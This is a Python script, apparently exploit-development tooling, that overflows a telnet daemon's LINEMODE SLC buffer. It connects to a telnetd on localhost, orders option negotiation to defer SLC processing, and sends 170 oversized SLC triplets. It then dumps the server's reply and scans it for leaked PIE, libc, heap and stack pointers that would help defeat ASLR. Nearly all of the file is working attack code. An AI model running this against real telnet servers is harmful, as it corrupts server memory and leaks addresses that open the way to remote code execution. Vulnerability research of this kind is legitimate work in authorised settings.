#!/usr/bin/env python3
"""Analyze SLC response bytes from telnetd for leaked PIE/libc pointers.

Uses the defer trick sequence. The key insight is that subneg SEND requests
come AFTER we send WILL for each option, so we need to handle them in order.
"""

import socket
import sys
import time
import struct

# Telnet protocol
IAC  = 0xFF
DONT = 0xFE
DO   = 0xFD
WONT = 0xFC
WILL = 0xFB
SB   = 0xFA
SE   = 0xF0

OPT_TTYPE       = 0x18
OPT_NAWS        = 0x1F
OPT_TSPEED      = 0x20
OPT_LINEMODE    = 0x22
OPT_XDISPLOC    = 0x23
OPT_OLD_ENVIRON = 0x24
OPT_NEW_ENVIRON = 0x27

LM_MODE = 0x01
LM_SLC  = 0x03
NSLC    = 18

NE_IS    = 0x00
NE_VAR   = 0x00
NE_VALUE = 0x01

OPT_NAMES = {0x18:'TTYPE', 0x1F:'NAWS', 0x20:'TSPEED', 0x22:'LINEMODE',
              0x23:'XDISPLOC', 0x24:'OLD_ENVIRON', 0x27:'NEW_ENVIRON'}


def recv_all(s, timeout=2):
    s.settimeout(timeout)
    chunks = []
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
    except socket.timeout:
        pass
    except (ConnectionResetError, BrokenPipeError, OSError):
        pass
    return b''.join(chunks)


def parse_telnet(data):
    cmds = []
    i = 0
    while i < len(data):
        if data[i] == IAC and i + 1 < len(data):
            cmd = data[i + 1]
            if cmd in (DO, DONT, WILL, WONT) and i + 2 < len(data):
                cmds.append((cmd, data[i + 2]))
                i += 3
            elif cmd == SB and i + 2 < len(data):
                j = i + 2
                while j < len(data) - 1:
                    if data[j] == IAC and data[j + 1] == SE:
                        break
                    j += 1
                cmds.append((SB, bytes(data[i+2:j])))
                i = j + 2
            elif cmd == IAC:
                i += 2
            else:
                i += 2
        else:
            i += 1
    return cmds


def build_slc_overflow(num_triplets):
    data = bytearray()
    for i in range(num_triplets):
        func = NSLC + 1 + i  # 0x13, 0x14, ...
        if func > 0xFF:
            func = 0xFE
        if func == IAC:
            data.extend([IAC, IAC, 0x02, 0x00])
        else:
            data.extend([func, 0x02, 0x00])
    return bytes(data)


def undouble_iac(data):
    result = bytearray()
    i = 0
    while i < len(data):
        if i + 1 < len(data) and data[i] == 0xFF and data[i+1] == 0xFF:
            result.append(0xFF)
            i += 2
        else:
            result.append(data[i])
            i += 1
    return bytes(result)


def hexdump(data, prefix=""):
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print(f"{prefix}{i:04x}: {hex_part:<48s}  {ascii_part}")


def respond_to_sb(sb_data):
    """Generate response to a subnegotiation SEND request."""
    resp = bytearray()
    sub_opt = sb_data[0]
    if sub_opt == OPT_TSPEED:
        resp.extend([IAC, SB, OPT_TSPEED, 0x00])
        resp.extend(b'38400,38400')
        resp.extend([IAC, SE])
    elif sub_opt == OPT_XDISPLOC:
        resp.extend([IAC, SB, OPT_XDISPLOC, 0x00])
        resp.extend(b':0')
        resp.extend([IAC, SE])
    elif sub_opt == OPT_NEW_ENVIRON:
        resp.extend([IAC, SB, OPT_NEW_ENVIRON, NE_IS])
        resp.extend([NE_VAR])
        resp.extend(b'USER')
        resp.extend([NE_VALUE])
        resp.extend(b'root')
        resp.extend([IAC, SE])
    elif sub_opt == OPT_OLD_ENVIRON:
        resp.extend([IAC, SB, OPT_OLD_ENVIRON, NE_IS, IAC, SE])
    elif sub_opt == OPT_TTYPE:
        resp.extend([IAC, SB, OPT_TTYPE, 0x00])
        resp.extend(b'xterm')
        resp.extend([IAC, SE])
    return bytes(resp)


def analyze_slc_body(body, connection_num):
    print(f"\n{'='*70}")
    print(f"  SLC RESPONSE ANALYSIS (Connection #{connection_num})")
    print(f"{'='*70}")
    print(f"[*] SLC body length: {len(body)} bytes ({len(body)//3} triplets, {len(body)%3} remainder)")

    print(f"\n--- Full hex dump of SLC body ---")
    hexdump(body)

    print(f"\n--- SLC Triplets ---")
    num_triplets = len(body) // 3

    for i in range(num_triplets):
        offset = i * 3
        func = body[offset]
        mod = body[offset + 1]
        val = body[offset + 2]
        marker = ""
        if i < NSLC:
            marker = " (normal SLC)"
        else:
            marker = " [OVERFLOW]"
            if mod != 0x00 or val != 0x00:
                marker += " ** NON-ZERO **"
        print(f"  [{i:3d}] offset={offset:3d}  func=0x{func:02x} mod=0x{mod:02x} val=0x{val:02x}{marker}")

    remainder = len(body) % 3
    if remainder:
        print(f"\n  Remainder bytes: {body[num_triplets*3:].hex()}")

    # Analyze overflow region
    overflow_start = NSLC * 3  # 54 bytes
    print(f"\n--- Pointer Analysis (overflow region, after first {overflow_start} bytes) ---")
    if len(body) <= overflow_start:
        print("  No overflow data present.")
        return

    overflow = body[overflow_start:]
    print(f"  Overflow region: {len(overflow)} bytes")
    hexdump(overflow, prefix="  ")

    nonzero_offsets = [(i, overflow[i]) for i in range(len(overflow)) if overflow[i] != 0x00]
    if nonzero_offsets:
        print(f"\n  Non-zero bytes in overflow region ({len(nonzero_offsets)} total):")
        for off, val in nonzero_offsets[:50]:
            abs_off = overflow_start + off
            print(f"    offset {abs_off} (overflow+{off}): 0x{val:02x}")
        if len(nonzero_offsets) > 50:
            print(f"    ... and {len(nonzero_offsets)-50} more")
    else:
        print(f"\n  All bytes in overflow region are zero.")

    # 32-bit LE pointer scan
    print(f"\n--- 32-bit LE pointer scan (overflow region, all alignments) ---")
    found_any = False
    for i in range(len(overflow) - 3):
        val32 = struct.unpack('<I', overflow[i:i+4])[0]
        if val32 == 0:
            continue
        abs_off = overflow_start + i
        tag = ""
        if 0x56000000 <= val32 <= 0x56FFFFFF:
            tag = " *** POSSIBLE PIE BASE ***"
        elif 0xf7000000 <= val32 <= 0xf7FFFFFF:
            tag = " *** POSSIBLE LIBC ***"
        elif 0x08000000 <= val32 <= 0x08FFFFFF:
            tag = " *** POSSIBLE HEAP/CODE ***"
        elif 0x57000000 <= val32 <= 0x57FFFFFF:
            tag = " *** POSSIBLE HEAP ***"
        elif 0xff000000 <= val32 <= 0xffFFFFFF:
            tag = " *** POSSIBLE STACK ***"

        if tag:
            found_any = True
            print(f"  offset {abs_off} (overflow+{i}): 0x{val32:08x}{tag}")

    if not found_any:
        print("  No PIE/libc/heap/stack pointer-like values found.")

    # Show ALL non-zero 32-bit values
    print(f"\n  All non-zero 32-bit LE values in overflow region:")
    for i in range(0, len(overflow) - 3, 4):  # aligned scan
        val32 = struct.unpack('<I', overflow[i:i+4])[0]
        if val32 != 0:
            abs_off = overflow_start + i
            print(f"    offset {abs_off} (overflow+{i}): 0x{val32:08x}")

    # Full body pointer scan
    print(f"\n--- 32-bit LE pointer scan (FULL body, all byte offsets) ---")
    found_full = False
    for i in range(len(body) - 3):
        val32 = struct.unpack('<I', body[i:i+4])[0]
        tag = ""
        if 0x56000000 <= val32 <= 0x56FFFFFF:
            tag = " *** POSSIBLE PIE BASE ***"
        elif 0xf7000000 <= val32 <= 0xf7FFFFFF:
            tag = " *** POSSIBLE LIBC ***"
        elif 0x08000000 <= val32 <= 0x08FFFFFF:
            tag = " *** POSSIBLE HEAP/CODE ***"
        elif 0x57000000 <= val32 <= 0x57FFFFFF:
            tag = " *** POSSIBLE HEAP ***"
        elif 0xff000000 <= val32 <= 0xffFFFFFF:
            tag = " *** POSSIBLE STACK ***"
        if tag:
            found_full = True
            print(f"  offset {i}: 0x{val32:08x}{tag}")
    if not found_full:
        print("  No PIE/libc/heap/stack pointer-like values found in full body.")


def do_connection(connection_num, num_triplets=170):
    print(f"\n{'#'*70}")
    print(f"  CONNECTION #{connection_num}")
    print(f"{'#'*70}")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(('localhost', 2325))
        print(f"[*] Connected to localhost:2325")
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return None

    all_slc_bodies = []

    try:
        # R1: Get initial DOs
        time.sleep(0.3)
        data1 = recv_all(s, timeout=1)
        cmds1 = parse_telnet(data1)
        print(f"[*] R1: {len(cmds1)} commands, {len(data1)} bytes")
        for cmd, opt in cmds1:
            if cmd == DO:
                print(f"    DO {OPT_NAMES.get(opt, hex(opt))}")

        # Step 1: WILL LINEMODE (unsolicited)
        print(f"\n[*] Step 1: Sending WILL LINEMODE (unsolicited)")
        s.send(bytes([IAC, WILL, OPT_LINEMODE]))
        time.sleep(0.3)
        data_lm = recv_all(s, timeout=1)
        got_do_linemode = False
        if data_lm:
            cmds_lm = parse_telnet(data_lm)
            for cmd, opt in cmds_lm:
                if cmd == DO and opt == OPT_LINEMODE:
                    got_do_linemode = True
                    print(f"    Got DO LINEMODE")
                elif cmd == SB:
                    if isinstance(opt, bytes) and len(opt) > 1 and opt[0] == OPT_LINEMODE:
                        print(f"    Got SB LINEMODE (sub={opt[1]:#04x}, len={len(opt)})")
                    else:
                        print(f"    Got SB (len={len(opt)})")

        # Step 2: SLC overflow (deferred because terminit==0)
        slc_data = build_slc_overflow(num_triplets)
        slc_pkt = bytearray([IAC, SB, OPT_LINEMODE, LM_SLC])
        slc_pkt.extend(slc_data)
        slc_pkt.extend([IAC, SE])
        print(f"\n[*] Step 2: Sending SLC overflow ({len(slc_data)}B, {num_triplets} triplets)")
        s.send(bytes(slc_pkt))
        time.sleep(0.3)
        drain = recv_all(s, timeout=0.5)
        if drain:
            print(f"    After SLC: {len(drain)}B - checking for SLC response...")
            cmds_drain = parse_telnet(drain)
            for cmd, opt in cmds_drain:
                if cmd == SB and isinstance(opt, bytes) and len(opt) > 1 and opt[0] == OPT_LINEMODE and opt[1] == LM_SLC:
                    body = undouble_iac(opt[2:])
                    all_slc_bodies.append(body)
                    print(f"    Got SLC response (NOT deferred): {len(body)}B")
        else:
            print(f"    No response (good - data deferred)")

        # Step 3: Send WILLs for all non-LINEMODE options + respond to their SB SENDs
        # Send all WILLs at once
        resp = bytearray()
        for cmd, opt in cmds1:
            if cmd == DO and opt not in (OPT_LINEMODE, OPT_TTYPE):
                resp.extend([IAC, WILL, opt])
            elif cmd == WILL:
                resp.extend([IAC, DO, opt])

        # Also send LINEMODE MODE response
        resp.extend([IAC, SB, OPT_LINEMODE, LM_MODE, 0x06, IAC, SE])
        # NAWS
        resp.extend([IAC, SB, OPT_NAWS, 0x00, 0x50, 0x00, 0x18, IAC, SE])
        s.send(bytes(resp))
        print(f"\n[*] Step 3: Sent WILLs + LINEMODE MODE + NAWS")

        time.sleep(0.5)
        data3 = recv_all(s, timeout=2)
        cmds3 = parse_telnet(data3)
        print(f"    Response: {len(cmds3)} commands, {len(data3)} bytes")

        # Respond to all SB SEND requests
        resp_sub = bytearray()
        for cmd, opt in cmds3:
            if cmd == SB and isinstance(opt, bytes):
                opt_code = opt[0]
                print(f"    SB {OPT_NAMES.get(opt_code, hex(opt_code))} (sub={opt[1] if len(opt)>1 else '?'})")
                sub_resp = respond_to_sb(opt)
                if sub_resp:
                    resp_sub.extend(sub_resp)
                # Check for SLC response
                if opt_code == OPT_LINEMODE and len(opt) > 1 and opt[1] == LM_SLC:
                    body = undouble_iac(opt[2:])
                    all_slc_bodies.append(body)
                    print(f"    *** SLC RESPONSE: {len(body)}B ***")
            elif cmd == DO:
                print(f"    DO {OPT_NAMES.get(opt, hex(opt))}")
                if opt != OPT_LINEMODE:
                    resp_sub.extend([IAC, WILL, opt])

        if resp_sub:
            s.send(bytes(resp_sub))
            print(f"    Sent {len(resp_sub)}B of subneg responses")

        time.sleep(0.3)
        data3b = recv_all(s, timeout=1)
        if data3b:
            cmds3b = parse_telnet(data3b)
            print(f"    Follow-up: {len(cmds3b)} commands, {len(data3b)} bytes")
            for cmd, opt in cmds3b:
                if cmd == SB and isinstance(opt, bytes):
                    opt_code = opt[0]
                    print(f"      SB {OPT_NAMES.get(opt_code, hex(opt_code))}")
                    sub_resp = respond_to_sb(opt)
                    if sub_resp:
                        s.send(sub_resp)
                    if opt_code == OPT_LINEMODE and len(opt) > 1 and opt[1] == LM_SLC:
                        body = undouble_iac(opt[2:])
                        all_slc_bodies.append(body)
                        print(f"      *** SLC RESPONSE: {len(body)}B ***")

        # Step 4: Send WILL TTYPE + TTYPE IS response -> triggers getterminaltype exit -> deferslc
        resp_ttype = bytearray()
        resp_ttype.extend([IAC, WILL, OPT_TTYPE])
        s.send(bytes(resp_ttype))
        print(f"\n[*] Step 4a: Sent WILL TTYPE")

        time.sleep(0.5)
        data4 = recv_all(s, timeout=1)
        if data4:
            cmds4 = parse_telnet(data4)
            print(f"    Response: {len(cmds4)} commands, {len(data4)} bytes")
            for cmd, opt in cmds4:
                if cmd == SB and isinstance(opt, bytes):
                    opt_code = opt[0]
                    print(f"    SB {OPT_NAMES.get(opt_code, hex(opt_code))}")
                    sub_resp = respond_to_sb(opt)
                    if sub_resp:
                        s.send(sub_resp)
                    if opt_code == OPT_LINEMODE and len(opt) > 1 and opt[1] == LM_SLC:
                        body = undouble_iac(opt[2:])
                        all_slc_bodies.append(body)
                        print(f"    *** SLC RESPONSE: {len(body)}B ***")

        # Now send TTYPE IS xterm
        resp_ttype2 = bytearray()
        resp_ttype2.extend([IAC, SB, OPT_TTYPE, 0x00])
        resp_ttype2.extend(b'xterm')
        resp_ttype2.extend([IAC, SE])
        print(f"[*] Step 4b: Sending TTYPE IS xterm")

        try:
            s.send(bytes(resp_ttype2))
        except (BrokenPipeError, ConnectionResetError) as e:
            print(f"    CRASH on TTYPE send: {e}")
            return None

        # Wait and collect ALL data - deferslc should fire here
        time.sleep(2)
        data5 = recv_all(s, timeout=3)
        print(f"\n[*] Response after TTYPE IS: {len(data5)} bytes")

        if data5:
            print(f"\n--- Full response hex dump ---")
            hexdump(data5)

            cmds5 = parse_telnet(data5)
            for cmd, opt in cmds5:
                if cmd == SB and isinstance(opt, bytes):
                    opt_code = opt[0]
                    if opt_code == OPT_LINEMODE and len(opt) > 1 and opt[1] == LM_SLC:
                        body = undouble_iac(opt[2:])
                        all_slc_bodies.append(body)
                        print(f"\n    *** DEFERRED SLC RESPONSE: {len(body)}B ({len(body)//3} triplets) ***")
                    else:
                        print(f"    SB {OPT_NAMES.get(opt_code, hex(opt_code))}")
                elif cmd == DO:
                    print(f"    DO {OPT_NAMES.get(opt, hex(opt))}")
                elif cmd == WILL:
                    print(f"    WILL {OPT_NAMES.get(opt, hex(opt))}")

            text = bytes(b for b in data5 if 0x20 <= b < 0x7f).decode('ascii', errors='replace')
            if text.strip():
                print(f"    Text: {text.strip()[:200]}")
        else:
            print("    No data received after TTYPE IS")

        # Also try sending something to trigger more output
        time.sleep(0.5)
        try:
            s.send(b'\r\n')
            time.sleep(1)
            data6 = recv_all(s, timeout=2)
            if data6:
                print(f"\n[*] After CR/LF: {len(data6)} bytes")
                cmds6 = parse_telnet(data6)
                for cmd, opt in cmds6:
                    if cmd == SB and isinstance(opt, bytes):
                        opt_code = opt[0]
                        if opt_code == OPT_LINEMODE and len(opt) > 1 and opt[1] == LM_SLC:
                            body = undouble_iac(opt[2:])
                            all_slc_bodies.append(body)
                            print(f"    *** LATE SLC RESPONSE: {len(body)}B ***")
        except:
            pass

        # Analyze all collected SLC bodies
        print(f"\n[*] Total SLC responses collected: {len(all_slc_bodies)}")
        for idx, body in enumerate(all_slc_bodies):
            analyze_slc_body(body, connection_num)

        if not all_slc_bodies:
            print("[!] No SLC response found at all!")

        return data5

    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        return None
    finally:
        s.close()
        print(f"\n[*] Connection #{connection_num} closed")


def main():
    print("=" * 70)
    print("  SLC Response Leak Analyzer for telnetd overflow")
    print("=" * 70)

    resp1 = do_connection(1, num_triplets=170)
    time.sleep(1.0)
    resp2 = do_connection(2, num_triplets=170)

    if resp1 and resp2:
        print(f"\n{'='*70}")
        print(f"  COMPARISON")
        print(f"{'='*70}")
        if resp1 == resp2:
            print("  Responses are IDENTICAL")
        else:
            print(f"  Responses DIFFER (len1={len(resp1)}, len2={len(resp2)})")
            min_len = min(len(resp1), len(resp2))
            diffs = [i for i in range(min_len) if resp1[i] != resp2[i]]
            if diffs:
                print(f"  {len(diffs)} differing bytes, first 20: {diffs[:20]}")
                for off in diffs[:20]:
                    print(f"    offset {off}: conn1=0x{resp1[off]:02x} conn2=0x{resp2[off]:02x}")

    print("\n[*] Done.")


if __name__ == '__main__':
    main()
